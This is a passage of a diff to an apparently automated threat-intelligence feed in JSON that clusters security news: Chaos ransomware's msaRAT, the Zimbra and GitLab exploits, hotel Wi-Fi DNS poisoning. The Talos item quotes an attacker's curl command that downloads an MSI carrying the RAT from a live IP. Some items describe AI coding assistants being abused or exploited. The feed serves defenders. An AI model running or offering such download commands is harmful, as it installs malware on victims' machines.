over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Cisco"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Cisco": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Cisco Talos",
-          "cohort": "threat_research_primary",
-          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-          "published": "2026-07-23T10:00:38+00:00",
-          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Cisco"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Cisco": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "b4009da441",
       "priority_score": 10,
       "member_count": 1,
@@ -4968,6 +4650,252 @@
       ]
     },
     {
+      "cluster_id": "a1940e8772",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Cisco"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Cisco Talos",
+        "cohort": "threat_research_primary",
+        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+        "published": "2026-07-23T10:00:38+00:00",
+        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Cisco"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Cisco": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Cisco Talos",
+          "cohort": "threat_research_primary",
+          "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+          "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+          "published": "2026-07-23T10:00:38+00:00",
+          "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Cisco"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Cisco": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "2bab6cab95",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Anthropic/Claude",
+          "Microsoft SharePoint",
+          "WordPress"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-15409",
+          "CVE-2026-56155",
+          "CVE-2026-56164",
+          "CVE-2026-60137",
+          "CVE-2026-63030"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Check Point Research",
+        "cohort": "threat_research_primary",
+        "title": "20th July – Threat Intelligence Report",
+        "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
+        "published": "2026-07-20T12:18:41+00:00",
+        "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
+        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July – Threat Intelligence Report July 20, 2026 https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, employee details, and other sensitive information submitted while requesting technical assistance. Jscrambler, a JavaScript code-protection package with more than 15,000 weekly downloads, has experienced a supply chain compromise after stolen npm publishing credentials distributed malicious releases. The packages deployed malware targeting developers’, cloud, browser, cryptocurrency, and messaging credentials. Jscrambler removed the affected versions. Coca-Cola’s US dairy subsidiary Fairlife has confirmed a ransomware attack that temporarily halted production across the United States. Attackers accessed systems supporting manufacturing operations, prompting the company to activate incident response and business continuity procedures. Coca-Cola has not confirmed whether data was exfiltrated in the attack. Nihon Kotsu, Japan’s largest taxi operator, has suffered a malware attack following unauthorized access to its internal network. The company shut down affected systems, disrupting taxi dispatches, telephone services, bookings, reservations, and car rentals from July 11. No theft of customer or corporate information has been confirmed. AI THREATS Researchers identified a China-linked campaign that used Claude Code and DeepSeek to automate attacks against government and financial organizations. The tools generated scripts, adapted failed exploits, created credential-harvesting pages, and executed commands. Confirmed compromises affected government systems in Thailand and Afghanistan and organizations in Taiwan. Researchers found that xAI’s Grok Build coding assistant could upload entire Git repositories while processing debugging requests. Transferred information included unopened files and complete commit histories, potentially exposing API keys, credentials, and proprietary source code. Initial privacy controls did not prevent uploads until a server-side restriction was introduced. Researchers verified a weakness in Anthropic’s Claude for Chrome extension that allowed malicious browser extensions to impersonate Claude and act through authenticated user sessions. Successful exploitation could expose Gmail, Google Drive, or GitHub information through Claude’s permissions. Anthropic released fixes, although researchers reported that a bypass remained possible. VULNERABILITIES AND PATCHES Microsoft released patches for 622 vulnerabilities in July’s Patch Tuesday, the largest monthly release recorded by the company. Two vulnerabilities were under active exploitation, including CVE-2026-56164 in SharePoint Server and CVE-2026-56155 in Active Directory Federation Services. Both vulnerabilities could allow attackers to elevate privileges. Check Point IPS provides protection against these threats (Microsoft SharePoint Authentication Bypass (CVE-2026-56164)) WordPress has issued emergency updates for CVE-2026-63030 and CVE-2026-60137, collectively called wp2shell. The critical WordPress Core vulnerabilities allow unauthenticated remote code execution and website takeover. Affected releases include versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1. Fixed versions include 6.9.5 and 7.0.2. Check Point IPS provides protection against these threats (WordPress Authentication Bypass (CVE-2026-63030)), WordPress SQL Injection (CVE-2026-60137)) SonicWall has released a hotfix for CVE-2026-15409 and CVE-2026-15410, two critical vulnerabilities affecting SMA 1000 Series gat",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "government",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Anthropic/Claude",
+            "Microsoft SharePoint",
+            "WordPress"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-56164",
+            "CVE-2026-56155",
+            "CVE-2026-63030",
+            "CVE-2026-60137",
+            "CVE-2026-15409"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Anthropic/Claude": "target",
+            "Microsoft SharePoint": "target",
+            "WordPress": "target",
+            "SonicWall": "target",
+            "npm": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Check Point Research",
+          "cohort": "threat_research_primary",
+          "title": "20th July – Threat Intelligence Report",
+          "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
+          "published": "2026-07-20T12:18:41+00:00",
+          "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "government",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Anthropic/Claude",
+              "Microsoft SharePoint",
+              "WordPress"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-56164",
+              "CVE-2026-56155",
+              "CVE-2026-63030",
+              "CVE-2026-60137",
+              "CVE-2026-15409"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Anthropic/Claude": "target",
+              "Microsoft SharePoint": "target",
+              "WordPress": "target",
+              "SonicWall": "target",
+              "npm": "target",
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "75f4c3d8b0",
       "priority_score": 10,
       "member_count": 1,
@@ -5052,6 +4980,127 @@
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {
               "Microsoft Defender": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "abfdfb7a02",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "education",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Docker"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2025-66376"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "no_patch_yet"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Help Net Security",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Russian hackers exploit unpatched Zimbra servers to steal emails",
+        "link": "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
+        "published": "2026-07-24T12:09:44+00:00",
+        "summary": "Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s … More → The post Russian hackers exploit unpatched Zimbra servers to steal emails appeared first on Help Net Security .",
+        "full_body": "Sinisa Markovic , Managing Editor, Help Net Security July 24, 2026 Share Russian hackers exploit unpatched Zimbra servers to steal emails Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s targeting is almost certainly to gather sensitive information for the Russian Federation, with these actors primarily focusing on the covert acquisition of email data,” according to the joint security alert. Victims span the defense industrial base, federal and local government, education, energy, law enforcement, media, non-government organizations, and technology. Laundry Bear was first identified in May 2025, after Dutch intelligence traced a breach at the Dutch National Police back to a group stealing session cookies to get into police employee accounts. Attackers weaponize Zimbra XSS vulnerability The attackers’ latest campaign targets CVE-2025-66376, a cross-site scripting (XSS) vulnerability in the Zimbra web-based email and collaboration suite that was patched in November 2025. The advisory notes the group kept using the exploit even after the fix came out, meaning unpatched servers stay exposed. The flaw allows JavaScript embedded in a specially crafted HTML email to execute when the message is viewed, enabling attackers to steal account data without requiring the victim to click a link or visit a phishing page. “Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service,” reads the advisory. CISA says Laundry Bear’s exploit is used to collect victims’ last 90 days of email, email addresses and passwords, the organization’s email directory (including the Global Address List), two-factor authentication tokens, and newly created application passcodes. “The collected data is almost certainly further exfiltrated to internal network resources for review and long-term retention,” the agencies added. Cloud servers and VPNs conceal attacker activity Stolen data lands on a backend the advisory calls Flowerbed, a set of Docker containers running on rented cloud servers. One container, “Catcher,” acts as both a DNS and HTTP server to receive the stolen data. Another handles Let’s Encrypt certificates so the traffic looks like ordinary encrypted web traffic. The group leans on Mullvad VPN when logging into these servers and swaps out its infrastructure every 7 to 60 days, which makes long-term tracking harder. “The simplistic Flowerbed codebase has indications that artificial intelligence (AI) played a role in its development,” the advisory notes. What organizations should do To mitigate the risk, organizations are recommended to update their Zimbra deployments to the latest available versions, review the published IOCs, and check for connections to the identified domains and IP addresses. They should also watch authentication activity for anomalies, revoke unauthorized application passcodes, particularly ones created under the “ZimbraWeb” name, and check accounts for unauthorized mailbox access. “While Application Passcodes have non-malicious purposes, in this case instances of these passcodes with the name “ZimbraWeb” are almost certainly malicious,” the advisory warns . More about CISA CVE cyber espionage government phishing Russian Federation Share",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "phishing_social_eng",
+            "apt_espionage"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government",
+            "critical_infrastructure",
+            "manufacturing_industrial",
+            "education"
+          ],
+          "affected_products": [
+            "Docker"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2025-66376"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "no_patch_yet"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Docker": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Help Net Security",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Russian hackers exploit unpatched Zimbra servers to steal emails",
+          "link": "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
+          "published": "2026-07-24T12:09:44+00:00",
+          "summary": "Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s … More → The post Russian hackers exploit unpatched Zimbra servers to steal emails appeared first on Help Net Security .",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng",
+              "apt_espionage"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government",
+              "critical_infrastructure",
+              "manufacturing_industrial",
+              "education"
+            ],
+            "affected_products": [
+              "Docker"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2025-66376"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "no_patch_yet"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Docker": "target"
             },
             "weak_tags": {
               "products": []
@@ -5956,69 +6005,61 @@
       ]
     },
     {
-      "cluster_id": "ac9cea3220",
+      "cluster_id": "1a5eab7c27",
       "priority_score": 9,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "apt_espionage",
-          "phishing_social_eng"
+          "active_exploitation"
         ],
-        "actor_attribution": [
-          "APT28"
-        ],
-        "affected_industries": [
-          "education",
-          "healthcare"
-        ],
+        "actor_attribution": [],
+        "affected_industries": [],
         "affected_products": [
-          "Microsoft Entra"
+          "GitLab"
         ],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "poc_available"
+        ],
         "content_type": [
-          "incident_report"
+          "news_report"
         ],
         "confidence_tier": [
           "tier_4_news"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
+        "source": "The Hacker News",
         "cohort": "cyber_news_breach_reporting",
-        "title": "Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors",
-        "link": "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/",
-        "published": "2026-07-24T12:00:00+00:00",
-        "summary": "Researchers at ReliaQuest warned of widespread DNS poisoning attacks targeting the hospitality sector as part of a cyber espionage campaign",
-        "full_body": "Infosecurity Magazine Home » News » Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors News 24 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine A widespread DNS poisoning campaign is targeting the hotels, conference venues and the hospitality sector with credential harvesting attacks designed to steal corporate login credentials from visitors, researchers have warned. Identified by cybersecurity analysts at ReliaQuest, the campaign begins by targeting routers used to provide public Wi-Fi to visitors to hotels, conference centers and other shared venues frequently visited by corporate employees. These compromised Wi-Fi gateways were identified around the world, including across multiple US cities, India and Saudi Arabia. In a blog post published on July 23 , ReliaQuest researchers said that they believed initial access to the devices was achieved by exploiting exposed management interfaces, such as SSH, SNMP and web administration consoles, as well as weak or reused admin login credentials . With this access, the attacker modifies the configurations of the compromised routers and use DNS poisoning to redirect the web traffic, funneling connections for legitimate domains through attacker-controlled infrastructure. This means that a user can be compromised without the need for a phishing link, a malicious attachment or the attacker touching the device in any way. With no indication that anything could be amiss, the user will continue to use their device normally, oblivious to how the attackers can now monitor their activity, complete with being provided with the username, password and other sensitive information which belongs to the victim. Targeting Corporate Business Travelers By targeting hotels and conference venues known to be used by traveling corporate employees, the attackers can potentially get hold of a wide range of credentials which could be exploited to access sensitive information. “The compromised devices we investigated were appliances primarily used at hotels and other organizations running captive Wi-Fi services,” ReliaQuest researchers warned. “However, any operator of a captive portal network –such as airports, conference centers, co-working spaces, universities, healthcare facilities and event venues –faces a structurally similar attack surface, they added. The researchers noted that the tradecraft used in the DNS poisoning campaign, which is still ongoing, is similar to previous campaigns attributed to APT28 , also known as Fancy Bear and Forest Blizzard, a cyber espionage group linked to the Russian military intelligence agency (GRU). ReliaQuest has issued advice on how to prevent DNS poisoning from reaching endpoints, eliminating the attack surface and detecting credential-harvesting activity if it occurs. The recommendations include: Enforcing always-on VPN with full-tunnel configuration: Require all corporate devices to use a VPN with full-tunnel configuration, ensuring all DNS requests route through trusted corporate resolvers Auditting proxy authentication logs for authentications from unknown hosts: Look for suspicious logs from known abused infrastructure Disabling web proxy auto-discovery (WPAD) where not required Validating the site before entering credentials: Train employees to verify the URL and certificate of any page requesting credentials before entering them, particularly when connected to hotel, conference center, airport or other public Wi-Fi networks Disabling the device code authentication flow at the identity provider: In Microsoft Entra ID, configure a Conditional Access policy that blocks the device-code flow You may also like US Thwarts DNS Hijacking Network Controlled by Russian APT28 Hackers News 8 April 2026 Russian APT28 Hackers Hijack Routers to Steal Credentials, UK Security Agency Warns News 7 April 2026 Russian Espionage Operation Targets O",
+        "title": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git",
+        "link": "https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html",
+        "published": "2026-07-25T10:14:26+00:00",
+        "summary": "Security researchers at depthfirst published working exploit code on July 24 for a GitLab flaw that GitLab patched six weeks earlier, on June 10. It runs commands as git on any self-managed 18.11.3 server that has not taken the update. Any authenticated user who can push to a project can run it. The attacker commits a crafted Jupyter notebook and opens its commit diff, which leaks a heap",
+        "full_body": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git  Swati Khandelwal  Jul 25, 2026 Vulnerability / Application Security Security researchers at depthfirst published working exploit code on July 24 for a GitLab flaw that GitLab patched six weeks earlier, on June 10. It runs commands as git on any self-managed 18.11.3 server that has not taken the update. Any authenticated user who can push to a project can run it. The attacker commits a crafted Jupyter notebook and opens its commit diff, which leaks a heap pointer. Enough of those and an automated probe can locate the libraries in memory. Two more notebooks then fire the payload. No administrator rights, no CI or runner access, no victim interaction, no access to anyone else's project. GitLab did not file the fix as a security fix. A review by The Hacker News found the Oj 3.17.3 bump listed under bug fixes in the June 10 patch release , not in the security-fix table. There is no CVE, no CVSS score, and no mention of the notebook-diff chain. Operators who triaged that release against the security table had no reason to treat it as urgent. Two memory corruption bugs in Oj, a Ruby JSON parser implemented largely in native C, make the chain work. depthfirst says its system flagged them autonomously, and researchers chained them by hand. GitLab's notebook renderer, an in-tree gem called ipynbdiff , passes repository-controlled .ipynb JSON to Oj::Parser.usual.parse inside a long-lived Puma worker, so attacker-controlled bytes reach Oj's manually managed C memory inside the application process. One bug writes past a fixed 1,024-byte nesting stack until it controls the parser's start callback. The other truncates a 65,565-byte object key to 29 in a signed 16-bit field and returns a live heap pointer, which GitLab renders into the diff. The leak locates libc, and the write points the callback at system() . Component Affected First fixed GitLab CE/EE 15.2.0 to 18.10.7 18.10.8 GitLab CE/EE 18.11.0 to 18.11.4 18.11.5 GitLab CE/EE 19.0.0 to 19.0.1 19.0.2 Oj gem 3.13.0 to 3.17.1 3.17.3 All tiers are affected, CE and EE, Free through Ultimate. Ruby itself is not. Oj 3.17.2 carried other fixes from the same review but not these two. Upgrade to 18.10.8 , 18.11.5 , or 19.0.2 . Neither GitLab nor depthfirst offers a workaround for anyone who cannot. The trap is Helm and Operator: check the GitLab version inside the Webservice image running Puma, not the chart or Operator version. Anything on 15.2 through 18.9 gets no backport, because those lines sit outside GitLab's security-maintained patch trains , so those installs have to move to a supported release instead. Commands run as git , the account behind Puma. How far that goes depends on how the install is isolated. In reach: source code, Rails secrets, service credentials, CI/CD data, and internal services the application can talk to. The public exploit is built for GitLab 18.11.3 on x86-64. Gadget offsets, register state, and jemalloc behavior all came from that image, and a recovered library base holds only until the Puma master restarts, so this is not drop-in against an arbitrary target. The Oj bugs are general; porting the exploit is real work. depthfirst measured five to ten minutes for the memory search on a fresh two-worker install and projects one to two hours on longer-running ones. Its writeup has the full chain. depthfirst reported the Oj bugs on May 21, the maintainer merged fixes on May 27, and Oj 3.17.3 shipped June 4. The GitLab chain went to GitLab on June 5, was confirmed on June 8, and was patched on June 10. depthfirst says it is not aware of in-the-wild exploitation, and that GitLab reproduced the RCE independently. Its wider Oj review produced nine more CVE advisories, none of them this chain. The Hacker News has asked GitLab why the fix was not classified as a security issue and whether a CVE will be assigned, and asked depthfirst about exploit portability. Responses are pending. Found th",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "phishing_social_eng",
-            "apt_espionage"
+            "active_exploitation"
           ],
-          "actor_attribution": [
-            "APT28"
-          ],
-          "affected_industries": [
-            "healthcare",
-            "education"
-          ],
+          "actor_attribution": [],
+          "affected_industries": [],
           "affected_products": [
-            "Microsoft Entra"
+            "GitLab"
           ],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
+          "urgency_signals": [
+            "poc_available"
+          ],
+          "content_type": "news_report",
           "confidence_tier": "tier_4_news",
           "role_map": {
-            "Microsoft Entra": "target"
+            "GitLab": "target"
           },
           "weak_tags": {
             "products": []
@@ -6027,35 +6068,31 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
+          "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
-          "title": "Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors",
-          "link": "https://www.infosecurity-magazine.com/news/hotel-wifi-dns-poisoning/",
-          "published": "2026-07-24T12:00:00+00:00",
-          "summary": "Researchers at ReliaQuest warned of widespread DNS poisoning attacks targeting the hospitality sector as part of a cyber espionage campaign",
+          "title": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git",
+          "link": "https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html",
